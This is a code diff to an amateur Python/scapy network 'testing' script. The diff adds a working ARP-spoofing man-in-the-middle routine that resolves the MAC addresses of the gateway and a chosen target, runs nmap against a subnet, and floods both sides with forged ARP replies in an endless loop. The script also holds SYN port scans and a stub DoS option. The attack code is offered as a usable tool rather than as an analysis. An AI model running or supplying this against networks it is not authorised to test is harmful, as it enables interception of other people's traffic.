@@ -31,6 +31,8 @@ from time import sleep
 import sys
 import subprocess
 from scapy.all import *
+import scapy.all as scapy
+
 
 #vars
 src_port = 10000 #CHANGE THIS
@@ -83,9 +85,15 @@ def nmapscan():
 
 def basicostests():
 	sleep(0.5)
+	print("[*] Not redy yet, Check agian later")
+	homescreen()
+	homescreen()
+
+
+def basicnettests():
+	sleep(0.5)
 	#get Ip
 	IPadders = input("[*] Enter IP: ")
-	
 	#choses
 	sleep(0.5)
 	print("[*] Which would you like to check for:")
@@ -95,17 +103,69 @@ def basicostests():
 	if (inputchoice == "1"):
 		sleep(0.5)
 		print("[*] Starting mitm...")
+		sleep(0.5)
+		print("[*] Scanning...")
+		sleep(0.5)
+		arp_request=scapy.ARP(pdst=IPadders)
+		brodcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+		arp=brodcast/arp_request
+		answered=scapy.srp(arp, timeout=1,verbose=False)[0]
+		for element in answered:
+			print("[*] IP of Gateway:{}".format(element[1].psrc))
+			print("[*] MAC address of Gateway: {}\n".format(element[1].hwsrc))
+			macadders0 = "{}".format(element[1].hwsrc)
+			macadders = macadders0
+		command = "ip r"#EDIT COMMAND
+		sys.stdout.flush()
+		p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
+		(output, err) = p.communicate()
+		newoutput = str(output, 'UTF-8')
+		print("[*] What is your subnetmask?")
+		print("[*] Ex: 192.168.1.0/24")
+		subnetmask = input("[*] Subnetmask: ")
+		sleep(0.5)
+		print("[*] Starting nmap...")
+		sleep(0.5)
+		command = "nmap " + subnetmask #EDIT COMMAND
+		sys.stdout.flush()
+		p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
+		(output, err) = p.communicate()
+		newoutput = str(output, 'UTF-8')
+		otherip = input("Enter IP of device wanted to spoof: ")
+		sleep(0.5)
+		arp_request=scapy.ARP(pdst=otherip)
+		brodcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+		arp=brodcast/arp_request
+		answered=scapy.srp(arp, timeout=1,verbose=False)[0]
+		for element in answered:
+			print("[*] IP of Target:{}".format(element[1].psrc))
+			print("[*] MAC address of Target: {}\n".format(element[1].hwsrc))
+			macadders1 = "{}".format(element[1].hwsrc)
+			macaddersother = macadders1
+		sleep(0.5)
+
+		#spoofing functions
+		def spooftarget():
+			print("[*] Sending spoofed packets to target...")
+			packet = scapy.ARP(op = 2, pdst = otherip, hwdst = macaddersother, psrc = IPadders)
+			send(packet, verbose=False)
+		
+		def spoofgateway():
+			print("[*] Sending spoofed packets to router...")
+			packet = scapy.ARP(op = 2, pdst = IPadders, hwdst = macadders, psrc = otherip)
+			send(packet, verbose=False)
+
+		sent_packets_count = 0
+		while True:
+			sleep(1)
+			spooftarget()
+			spoofgateway()
+			sent_packets_count = sent_packets_count + 2
+			print("[*] Packets sent " + str(sent_packets_count) + " to target and gateway.")
+		
 	if (inputchoice == "2"):
 		sleep(0.5)
 		print("[*] Starting Dos...")
-		sleep(0.5)
-		print("[*] Chceking if port 53")
-	homescreen()
-	
-def basicnettests():
-	sleep(0.5)
-	print("[*] Not redy yet, Check agian later")
-	homescreen()
 
 def basicwebtests():
 	#sending packets
@@ -115,25 +175,25 @@ def basicwebtests():
 	dst_port = 80
 	sleep(0.5)
 	print("[*] Checking port vulns using scapy...")
-	tcp_connect_scan_resp = sr1(IP(dst=dst_ip)/TCP(sport=src_port,dport=dst_port,flags="S"),timeout=10)
-	if(tcp_connect_scan_resp.haslayer(TCP)):
-		if(tcp_connect_scan_resp.getlayer(TCP).flags == 0x12):
-			send_rst = sr(IP(dst=dst_ip)/TCP(sport=src_port,dport=dst_port,flags="AR"),timeout=10)
+	tcp_connect_scan_resp = sr1(scapy.IP(dst=dst_ip)/scapy.TCP(sport=src_port,dport=dst_port,flags="S"),timeout=10)
+	if(tcp_connect_scan_resp.haslayer(scapy.TCP)):
+		if(tcp_connect_scan_resp.getlayer(scapy.TCP).flags == 0x12):
+			send_rst = sr(scapy.IP(dst=dst_ip)/scapy.TCP(sport=src_port,dport=dst_port,flags="AR"),timeout=10)
 			print("[*] Port 80 is Open")
 			print("[*] Possibly a web server running on " + IPadders)
 			webservertests()
-		elif (tcp_connect_scan_resp.getlayer(TCP).flags == 0x14):
+		elif (tcp_connect_scan_resp.getlayer(scapy.TCP).flags == 0x14):
 			print ("[*] Port 80 is closed, trying port 443")
 			dst_port = 443
-			tcp_connect_scan_resp = sr1(IP(dst=dst_ip)/TCP(sport=src_port,dport=dst_port,flags="S"),timeout=10)
-			if(tcp_connect_scan_resp.haslayer(TCP)):
-					if(tcp_connect_scan_resp.getlayer(TCP).flags == 0x12):
-							send_rst = sr(IP(dst=dst_ip)/TCP(sport=src_port,dport=dst_port,flags="AR"),timeout=10)
+			tcp_connect_scan_resp = sr1(scapy.IP(dst=dst_ip)/scapy.TCP(sport=src_port,dport=dst_port,flags="S"),timeout=10)
+			if(tcp_connect_scan_resp.haslayer(scapy.TCP)):
+					if(tcp_connect_scan_resp.getlayer(scapy.TCP).flags == 0x12):
+							send_rst = sr(scapy.IP(dst=dst_ip)/scapy.TCP(sport=src_port,dport=dst_port,flags="AR"),timeout=10)
 							print("[*] Port 443 is Open")
 							sleep(0.5)
 							print("[*] Possibly a web server running on " + IPadders)
 							webservertests()
-					elif (tcp_connect_scan_resp.getlayer(TCP).flags == 0x14):
+					elif (tcp_connect_scan_resp.getlayer(scapy.TCP).flags == 0x14):
 							print ("[*] Both Port 80 and Pory 443 are closed on " + IPadders)
 							homescreen()
 
@@ -181,11 +241,8 @@ homescreen()
 
 
 
-	
-	
-	
-	
-	
-	
-	
-		
+
+
+
+
+#end the code
